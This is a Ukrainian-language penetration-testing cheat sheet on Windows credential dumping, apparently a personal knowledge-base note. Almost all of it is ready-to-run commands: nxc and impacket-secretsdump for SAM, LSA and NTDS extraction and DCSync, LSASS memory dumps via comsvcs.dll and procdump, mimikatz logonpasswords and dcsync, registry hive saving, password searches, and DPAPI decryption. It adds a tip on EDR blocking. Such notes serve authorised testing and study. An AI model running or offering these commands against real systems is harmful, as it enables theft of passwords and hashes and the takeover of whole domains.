# Credential Dumping

## nxc — найшвидше (remote, з кредами / хешем)
```bash
nxc smb <IP> -u <u> -p <p> --sam          # локальні хеші SAM
nxc smb <IP> -u <u> -p <p> --lsa          # LSA secrets (сервісні акаунти, cached creds)
nxc smb <IP> -u <u> -p <p> --ntds         # тільки проти DC — весь NTDS.dit
# pass-the-hash варіант:
nxc smb <IP> -u <u> -H <NTLM> --sam
```

## impacket-secretsdump (remote)
```bash
# проти звичайного хоста (потрібні local admin)
impacket-secretsdump '<domain>/<u>:<p>'@<IP>
# проти DC (DCSync)
impacket-secretsdump '<domain>/<u>:<p>'@<DC-IP> -just-dc-ntlm
```

## LSASS dump (локально на Windows-цілі)

### Метод 1: comsvcs.dll (без додаткових бінарників)
```cmd
# отримай PID lsass:
tasklist /fi "imagename eq lsass.exe"
# дамп:
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Temp\lsass.dmp full
```
### Метод 2: procdump (sysinternals)
```cmd
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```
### Розбір дампу (на атакері)
```bash
pypykatz lsa minidump lsass.dmp
```

## Mimikatz (на Windows, потрібен SeDebugPrivilege / SYSTEM)
```powershell
# Інтерактивно:
privilege::debug
sekurlsa::logonpasswords       # plaintext + NTLM з LSASS
lsadump::sam                   # локальна SAM
lsadump::dcsync /user:krbtgt   # DCSync без виходу на диск
# Одним рядком через PS:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

## pypykatz / lsassy (Linux-side)
```bash
# з файлу дампу:
pypykatz lsa minidump lsass.dmp
# remote (lsassy = lsass dump + розбір через SMB):
lsassy -d <domain> -u <u> -p <p> <IP>
```

## Витяг кредів з файлів (Windows)
```powershell
# SAM/SYSTEM hive backup (якщо є):
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak
# на атакері:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
# збережені креди Windows (credential manager):
cmdkey /list
# пошук паролів у файлах:
findstr /si "password" *.txt *.xml *.ini *.config
# реєстр:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## DPAPI (збережені браузерні паролі тощо)
```bash
# витяг через nxc:
nxc smb <IP> -u <u> -p <p> --dpapi
# або impacket-dpapi (потрібен masterkey):
impacket-dpapi masterkey -file <masterkey-path> -sid <user-SID> -password <pass>
```

## Підводні камені
- comsvcs.dll дамп може блокуватись EDR; спробуй через Task Manager → Create dump file
- Mimikatz після Windows 10 1803+ не дає plaintext за замовчуванням; NTLM-хеші все одно є
- Для lsassy потрібен local admin на SMB

**Зв'язки:** [[Password-Attacks]] · [[Lateral-Movement]] · [[DCSync-Tickets]] · [[Credentials]]
